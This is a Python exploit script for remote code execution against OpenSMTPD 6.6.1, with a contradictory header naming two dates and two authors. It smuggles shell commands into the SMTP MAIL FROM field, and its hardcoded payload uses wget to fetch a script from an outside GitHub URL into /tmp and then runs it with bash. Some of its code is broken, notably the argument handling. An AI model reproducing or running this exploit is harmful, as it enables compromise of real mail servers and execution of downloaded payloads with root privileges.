# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Date: 2022
# Author: Eric
#!/usr/local/bin/python3

from socket import *
import sys
import base64
import time

input("Please enter the following arguements - IP and Port.")
ADDR = sys.argv[0]
PORT = sys.argv[1]
CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']

for cmdnum in range(len(CMD)):
    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ADDR, PORT))
    res = s.recv(1024)
    if 'OpenSMTPD' not in str(res):
        print('[!] No OpenSMTPD detected')
        print('[!] Received {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] OpenSMTPD detected')
    s.send(b'HELO x\r\n')
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error connecting, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Connected, sending payload' + CMD[cmdnum])
    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
    res = s.recv(1024)
    if '250' not in str(res):
        print('[!] Error sending payload, expected 250')
        print('[!] Received: {}'.format(str(res)))
        print('[!] Exiting...')
        sys.exit(1)

    print('[*] Payload sent')
    s.send(b'RCPT TO:<root>\r\n')
    s.recv(1024)
    s.send(b'DATA\r\n')
    s.recv(1024)
    s.send(b'\r\nxxx\r\n.\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.recv(1024)
    print('[*] Done')
    time.sleep(3)


